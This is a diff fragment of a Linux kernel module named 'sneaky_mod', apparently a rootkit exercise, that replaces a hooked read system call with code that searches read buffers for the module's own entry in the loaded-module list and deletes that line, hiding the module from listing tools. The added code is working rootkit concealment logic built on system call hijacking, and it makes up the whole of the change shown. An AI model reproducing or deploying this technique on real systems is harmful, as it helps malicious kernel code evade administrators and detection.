@@ -93,7 +93,23 @@ asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
 }
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
-  return (*original_read)(fd, buf, count);
+  
+  ssize_t value = (*original_read)(fd, buf, count); 
+  char* sn_pos = strstr(buf, "sneaky_mod 16384 0 - Live 0xffffffff");
+  if(sn_pos != NULL && sn_pos >= (char*)buf && sn_pos < (char*)buf + count)
+  {
+    char* line_pos = strchr(sn_pos, '\n');
+    if(line_pos != NULL && line_pos >= (char*)buf && line_pos < (char*)buf + count) {
+      printk(KERN_INFO "hide from read\n");
+      int length = line_pos + 1 - sn_pos;
+      memmove(sn_pos, line_pos + 1, value - (line_pos + 1 - (char*)buf ));
+      value -= line_pos + 1 - sn_pos;
+    }
+  }
+  return value;
+  /*
+  TODO: sneaky_mod 16384 0 - Live 0xffffffffc02f4000 (POE)
+  */
 }
 
 //The code that gets executed when the module is loaded
